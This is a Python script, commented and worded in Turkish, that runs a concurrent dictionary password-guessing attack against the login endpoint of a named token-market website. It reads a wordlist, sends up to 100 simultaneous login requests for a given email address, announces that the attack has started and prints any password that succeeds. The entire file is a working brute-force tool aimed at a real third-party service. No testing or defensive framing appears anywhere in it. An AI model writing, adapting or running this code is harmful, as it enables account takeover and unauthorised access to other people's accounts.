import argparse
import asyncio
import aiohttp
from colorama import Fore, Style, init
import json
import sys

def is_number(value):
    try:
        float(value)  # float veya int kontrolü için float() kullanılır
        return True
    except ValueError:
        return False


# Colorama'nın terminali destekleyip desteklemediğini kontrol eder
init(autoreset=True)

# Terminal parametrelerini al
parser = argparse.ArgumentParser(description='Şifre deneme aracı.')
parser.add_argument('--mail', '-m', required=True, help='E-posta adresi')
parser.add_argument('--wordlist', '-w', required=True, help='Şifre dosyasının yolu')
parser.add_argument('--output-count', '-oc', required=False, default=1000, help='Şifre dosyasının yolu')

args = parser.parse_args()

# E-posta adresi ve şifre dosyasının yolu
email = args.mail
wordlist_path = args.wordlist
if is_number(args.output_count) and "." not in args.output_count and "-" not in args.output_count:
	output_count = args.output_count
else:
	output_count = 1000
count = 0
# Büyük dosyayı okur
try:
	with open(wordlist_path, "r") as file:
	    passwords = file.read().splitlines()
except FileNotFoundError:
	print(f"{Fore.RED}HATA: Wordlist Bulunamadı!")
	exit()
except:
	print(f"{Fore.RED}HATA: Wordlist Okunamıyor veya Sistemsel Bir Hata!")
	exit()
lenpord = len(passwords)
def format_time(seconds):
    days = seconds // (24 * 3600)
    seconds %= (24 * 3600)
    
    hours = seconds // 3600
    seconds %= 3600
    
    minutes = seconds // 60
    seconds %= 60
    
    result = []
    if days > 0:
        result.append(f"{days} gün")
    if hours > 0:
        result.append(f"{hours} saat")
    if minutes > 0:
        result.append(f"{minutes} dakika")
    if seconds > 0 or not result:
        result.append(f"{seconds} saniye")
    
    return " ".join(result)

# İstek gönderme fonksiyonu
async def try_password(session, password, index, total, cancel_event):
    url = "https://artensatokenmarket.com/ajax/login"
    payload = {
        "email": email,
        "sifre": password
    }
    try:
        # İptal olma durumunu kontrol et
        if cancel_event.is_set():
            return False

        async with session.post(url, data=payload) as response:
            response_text = await response.text()

            # Yanıtı kontrol et
            try:
                response_json = json.loads(response_text)
                status = response_json.get("durum", "")
            except json.JSONDecodeError:
                status = ""
            global count
            count += 1
            percentage = (count / total) * 100
            message = f"{Fore.LIGHTGREEN_EX} -> BULUNDU: {Style.RESET_ALL} ({count}/{lenpord} | %{percentage:.2f})\n{Fore.YELLOW} ---> E-Mail:{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX}{email}{Style.RESET_ALL}\n{Fore.YELLOW} ---> Şifre:{Style.RESET_ALL} {Fore.LIGHTYELLOW_EX}{password}{Style.RESET_ALL}"
            message2 = f"{Fore.MAGENTA} -> Devam Ediyor: {Style.RESET_ALL} ({count}/{lenpord} | %{percentage:.2f}) -> `{password}`"
            
            if status != "error":
                test = message
                print(test)
                return True
            else:
                if (int(count) % int(output_count))== 0:
                	print(message2)
                else:
                	pass
                return False
    except Exception as e:
        return False

# Ana fonksiyon
async def main():
    total = len(passwords)
    max_concurrent_requests = 100  # Aynı anda çalışacak görev sayısı
    semaphore = asyncio.Semaphore(max_concurrent_requests)
    cancel_event = asyncio.Event()

    async def sem_task(password, index):
        async with semaphore:
            return await try_password(session, password, index, total, cancel_event)

    async with aiohttp.ClientSession() as session:
        total_seconds = total / 40
        formatted_time = format_time(int(total_seconds))
        

        print(f"{Fore.CYAN}---------------------------------------------------{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN} -> Mail       :{Style.RESET_ALL} {args.mail}")
        print(f"{Fore.CYAN} -> Wordlist   :{Style.RESET_ALL} {args.wordlist}")
        print(f"{Fore.CYAN} -> Tahmini    :{Style.RESET_ALL} {formatted_time}")
        print(f"{Fore.CYAN} -> Çıktı Sayı :{Style.RESET_ALL} {output_count}")
        
        print(f"{Fore.CYAN}---------------------------------------------------{Style.RESET_ALL}")
        print(f" |----->{Fore.GREEN} SALDIRI BAŞLATILDI!{Style.RESET_ALL} <-----|")
       
        
        tasks = []
        for index, password in enumerate(passwords):
            if cancel_event.is_set():
                break  # Şifre bulundu, döngüyü durdur

            task = asyncio.create_task(sem_task(password, index))
            tasks.append(task)

            # Görevleri kümeler halinde gönder
            if len(tasks) >= max_concurrent_requests:
                results = await asyncio.gather(*tasks)
                if any(results):
                    break  # Şifre bulundu, döngüyü durdur
                tasks = []

        if tasks:
            results = await asyncio.gather(*tasks)
            if any(results):
                return  # Şifre bulundu, işlemi sonlandır

# Çalıştır
asyncio.run(main())
